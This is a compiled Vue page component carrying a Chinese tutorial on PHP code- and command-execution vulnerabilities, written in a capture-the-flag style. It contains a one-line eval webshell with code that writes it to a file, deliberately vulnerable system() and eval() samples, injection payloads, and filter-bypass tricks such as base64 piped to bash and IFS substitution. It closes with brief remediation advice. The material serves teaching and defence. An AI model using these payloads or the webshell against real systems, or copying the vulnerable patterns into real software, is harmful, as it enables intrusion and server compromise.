import{_ as o}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as i,c as u,d,w as a,e,r,a as n,b as s}from"./app.04d5a320.js";const k={},v=e(`<div class="custom-container tip"><p class="custom-container-title">代码执行和命令执行区别</p><p>代码执行：可执行脚本语言代码</p><p>命令执行：可执行系统命令(Linux、Windows)</p></div><h2 id="php代码执行" tabindex="-1"><a class="header-anchor" href="#php代码执行" aria-hidden="true">#</a> PHP代码执行</h2><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">//把字符串作为PHP代码执</span>
<span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment">//检查一个断言是否为 FALSE，可用来执行代码</span>
<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment">//执行一个正则表达式的搜索和替换</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//把第一个参数作为回调函数调用</span>
<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//调用回调函数，并把一个数组参数作为回调函数的参数</span>
<span class="token function">array_map</span><span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">//为数组的每个元素应用回调函数</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="eval" tabindex="-1"><a class="header-anchor" href="#eval" aria-hidden="true">#</a> eval</h4><p>eval函数会将提交上来的值作为PHP代码处理，可以提交phpinfo(); 或者生成一句话shell</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;arg&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span>

fputs(fopen(&#39;shell.php&#39;,&#39;w+&#39;),&#39;<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>pwd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span>&#39;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="create-function" tabindex="-1"><a class="header-anchor" href="#create-function" aria-hidden="true">#</a> create_function</h4><p>在php 中使用create_function创建一个匿名函数（lambda-style）</p><p>如未对参数进行严格的过滤审查，可通过提交特殊字符串给create_function执行任意代码.</p><div class="language-PHP line-numbers-mode" data-ext="PHP"><pre class="language-PHP"><code>&lt;?php $test=$_GET[&quot;test&quot;];$new_func=create_function(&#39;$a,$b&#39;, $test);$new_func(2,M_E);?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="使用-绕过转义" tabindex="-1"><a class="header-anchor" href="#使用-绕过转义" aria-hidden="true">#</a> 使用<code>\${\${ }}</code>绕过转义</h4><p>代码使用反斜杠将echo后面的内容给转义了 与加addslashes()函数进行过滤是一样的</p><p>payload：<code>arg=\${\${phpinfo()}}</code></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$str</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;echo \\&quot;Hello &quot;</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;arg&quot;</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;!!\\&quot;; &quot;</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="php命令执行" tabindex="-1"><a class="header-anchor" href="#php命令执行" aria-hidden="true">#</a> PHP命令执行</h2><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">//执行外部程序，并且显示输出</span>
<span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>			<span class="token comment">//执行一个外部程序</span>
<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment">//通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</span>
<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">//执行外部程序并且显示原始输出</span>
<span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment">//在当前进程空间执行指定程序</span>
<span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>			<span class="token comment">//打开进程文件指针</span>
<span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">//执行一个命令，并且打开用来输入/输出的文件指针</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="简单示例" tabindex="-1"><a class="header-anchor" href="#简单示例" aria-hidden="true">#</a> 简单示例</h4><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;cmd&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;ping -c 3 &quot;</span> <span class="token operator">.</span> <span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
//功能是调用系统ping命令进行网络连通性诊断
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>payload攻击代码如下</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>?cmd=127.0.0.1;whoami
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="命令分隔符" tabindex="-1"><a class="header-anchor" href="#命令分隔符" aria-hidden="true">#</a> 命令分隔符</h3>`,21),m=n("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[n("pre",{class:"language-bash"},[n("code",null,[n("span",{class:"token punctuation"},";"),s("   "),n("span",{class:"token comment"},"#前面的执行完执行后面的"),s(`
`),n("span",{class:"token operator"},"|"),s("   "),n("span",{class:"token comment"},"#是管道符，显示后面的执行结果"),s(`
`),n("span",{class:"token operator"},"||"),s("  "),n("span",{class:"token comment"},"#当前面的执行出错时执行后面的"),s(`

可用%0A换行执行命令，换行符自身是一个有效的目录分隔符
`),n("span",{class:"token function"},"cat"),s(),n("span",{class:"token number"},"123"),s(`/flag
`),n("span",{class:"token function"},"cat"),s(),n("span",{class:"token number"},"123"),s(`%0Aflag
`)])]),n("div",{class:"line-numbers","aria-hidden":"true"},[n("div",{class:"line-number"}),n("div",{class:"line-number"}),n("div",{class:"line-number"}),n("div",{class:"line-number"}),n("div",{class:"line-number"}),n("div",{class:"line-number"}),n("div",{class:"line-number"})])],-1),b=n("div",{class:"language-powershell line-numbers-mode","data-ext":"powershell"},[n("pre",{class:"language-powershell"},[n("code",null,[s("&   "),n("span",{class:"token comment"},"#前面的语句为假则直接执行后面的"),s(`
&&  `),n("span",{class:"token comment"},"#前面的语句为假则直接出错，后面的也不执行"),s(`
`),n("span",{class:"token punctuation"},"|"),s("   "),n("span",{class:"token comment"},"#直接执行后面的语句"),s(`
`),n("span",{class:"token punctuation"},"|"),n("span",{class:"token punctuation"},"|"),s("  "),n("span",{class:"token comment"},"#前面出错执行后面的"),s(`
`)])]),n("div",{class:"line-numbers","aria-hidden":"true"},[n("div",{class:"line-number"}),n("div",{class:"line-number"}),n("div",{class:"line-number"}),n("div",{class:"line-number"})])],-1),h=e(`<p>PHP 支持一个执行运算符：<code>反引号（\`\`）</code> PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回。效果与函数 shell_exec() 相同，都是以字符串的形式返回一个命令的执行结果，可以保存到变量中</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">\`whoami\`</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="绕过技巧" tabindex="-1"><a class="header-anchor" href="#绕过技巧" aria-hidden="true">#</a> 绕过技巧</h3><h4 id="正则审查" tabindex="-1"><a class="header-anchor" href="#正则审查" aria-hidden="true">#</a> 正则审查</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>是否使用多行模式修饰符（/foo/m）
是否遗漏匹配对象末尾的换行符（/^\\d+$/）
是否允许空白字符（\\s）
是否误写反斜杠匹配模式（/\\/）
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="绕过空格" tabindex="-1"><a class="header-anchor" href="#绕过空格" aria-hidden="true">#</a> 绕过空格</h4><p>1）用<code>\${IFS}</code>代替</p><p>2）读取文件的时候利用重定向符<code>cat&lt;flag</code></p><p>3）花括号无空格<code>{cat,666.txt}</code></p><p>4）小提示：<code>$IFS</code>可截断后边的内容，<code>cat flag$IFS666.txt</code></p><h4 id="代替换行符" tabindex="-1"><a class="header-anchor" href="#代替换行符" aria-hidden="true">#</a> 代替换行符</h4><p>可用<code>%0A</code>换行执行命令，换行符自身是一个有效的目录分隔符</p><h4 id="引号逃逸" tabindex="-1"><a class="header-anchor" href="#引号逃逸" aria-hidden="true">#</a> 引号逃逸</h4><p>恶意命令被扩在引号内，可用 <code>\\</code> 转义引号逃逸</p><h4 id="长度限制" tabindex="-1"><a class="header-anchor" href="#长度限制" aria-hidden="true">#</a> 长度限制</h4><p>长度限制，通过构造文件来绕过</p><p>1）Linux下可以用 <code>1&gt;a</code> 创建文件名为a的空文件</p><p>2）<code>ls -t&gt;test</code> 则会将目录按时间排序后写进test文件中</p><p>3）sh 命令可以从一个文件中读取命令来执行</p><h4 id="黑名单绕过" tabindex="-1"><a class="header-anchor" href="#黑名单绕过" aria-hidden="true">#</a> 黑名单绕过</h4><p>测试代码</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;cmd&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;cat&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;ls&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;pwd&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;wget&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;ls -al &#39;<span class="token interpolation"><span class="token variable">$test</span></span>&#39;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#双引号</span>
ca<span class="token string">&quot;&quot;</span>t flag

<span class="token comment">#单引号</span>
<span class="token function">cat</span><span class="token string">&#39;&#39;</span>t flag

<span class="token comment">#反斜杠</span>
ca<span class="token punctuation">\\</span>t flag

<span class="token comment">#base64编码</span>
<span class="token builtin class-name">echo</span> <span class="token string">&quot;Y2F0IGZsYWc=&quot;</span><span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">bash</span>

<span class="token comment">#hex十六进制编码</span>
<span class="token builtin class-name">echo</span> “63617420666c6167” <span class="token operator">|</span> xxd <span class="token parameter variable">-r</span> -p<span class="token operator">|</span><span class="token function">bash</span>

<span class="token comment">#利用变量</span>
执行ls命令： <span class="token assign-left variable">a</span><span class="token operator">=</span>l<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>s<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">\`</span>$a$b<span class="token variable">\`</span></span>
查看文件内容: <span class="token assign-left variable">a</span><span class="token operator">=</span>c<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>at<span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span>flag<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">\`</span>$a$b $c<span class="token variable">\`</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="修复建议" tabindex="-1"><a class="header-anchor" href="#修复建议" aria-hidden="true">#</a> 修复建议</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>、尽量不要使用以上的代码/命令执行函数
<span class="token number">2</span>、使用disable_funtion<span class="token punctuation">(</span><span class="token punctuation">)</span>禁用以上函数
<span class="token number">3</span>、过滤所有能当作命令分隔符使用的字符
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,25);function g(f,_){const t=r("Tabs");return i(),u("div",null,[v,d(t,{id:"54",data:[{title:"Linux"},{title:"Windows"}]},{tab0:a(({title:p,value:c,isActive:l})=>[m]),tab1:a(({title:p,value:c,isActive:l})=>[b]),_:1}),h])}const $=o(k,[["render",g],["__file","命令执行漏洞.html.vue"]]);export{$ as default};
